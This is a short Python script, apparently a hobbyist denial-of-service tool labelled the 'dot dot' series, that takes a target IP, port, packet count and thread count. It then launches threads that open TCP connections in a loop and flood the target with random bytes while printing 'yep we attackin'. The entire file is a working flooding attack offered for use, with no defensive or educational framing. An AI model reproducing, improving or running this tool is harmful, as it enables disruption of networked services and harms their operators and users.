import socket
import random
import threading
import time
import os

print("-------------------------------------------")
print("            _____    ____      ____        ")
print("              |     |    |    |    |   |   ")
print("(dot)(dot)    |     |    |    |    |   |   ")
print("  O    O      |     |____|    |____|   |___")
print("-------------------------------------------")
print("first instalation in the dot dot series")
print("made by: Ccondir")
print("-------------------------------------------")
ip = str(input("[Q] target 1's IP:"))
port = int(input("[Q] Port(must be an number): "))
pack = int(input("[Q] packet/s(must be an number): "))
thread = int(input("[Q] Thread(must be an number): "))
time.sleep(5)
os.system("cls")
print("-------------------------------------------")
print("            _____    ____      ____        ")
print("              |     |    |    |    |   |   ")
print("(dot)(dot)    |     |    |    |    |   |   ")
print("  O    O      |     |____|    |____|   |___")
print("-------------------------------------------")
print("first instalation in the dot dot series")
print("made by: Ccondir")
print("-------------------------------------------")
time.sleep(5)

def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print("yep we attackin "+ip+" | sent: "+str(xx))
        except:
            s.close()
            print("done")
            time.sleep(10)

for x in range(thread):
    thread = threading.Thread(target=start)
    thread.start()

